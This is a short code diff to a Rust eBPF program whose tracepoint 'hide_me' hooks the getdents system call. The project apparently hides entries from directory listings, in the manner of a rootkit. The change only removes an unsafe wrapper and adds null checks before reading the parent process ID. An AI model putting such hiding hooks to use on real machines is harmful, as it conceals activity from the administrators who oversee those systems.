@@ -25,13 +25,13 @@ static JUMP_TABLE: ProgramArray = ProgramArray::with_max_entries(2, 0);
 
 #[tracepoint]
 pub fn hide_me(ctx: TracePointContext) -> u32 {
-    match unsafe { handle_getdents_enter(ctx) } {
+    match handle_getdents_enter(ctx) {
         Ok(ret) => ret,
         Err(ret) => ret,
     }
 }
 
-unsafe fn handle_getdents_enter(ctx: TracePointContext) -> Result<u32, u32> {
+fn handle_getdents_enter(ctx: TracePointContext) -> Result<u32, u32> {
     let pid_tgid = bpf_get_current_pid_tgid();
 
     if pid_tgid != 0 {
@@ -39,7 +39,16 @@ unsafe fn handle_getdents_enter(ctx: TracePointContext) -> Result<u32, u32> {
         // pid_t                      tgid;                 /*  1436     4 */
         let ppid = unsafe {
             let task = bpf_get_current_task() as *const task_struct;
+
+            if task.is_null() {
+                return Err(0);
+            }
             let real_parent = (*task).real_parent;
+
+            if real_parent.is_null() {
+                return Err(0);
+            }
+
             let ppid = (*real_parent).tgid;
             info!(&ctx, "task is {:x}", task as u64);
             info!(&ctx, "real_parent address: {:x}", real_parent as u64);
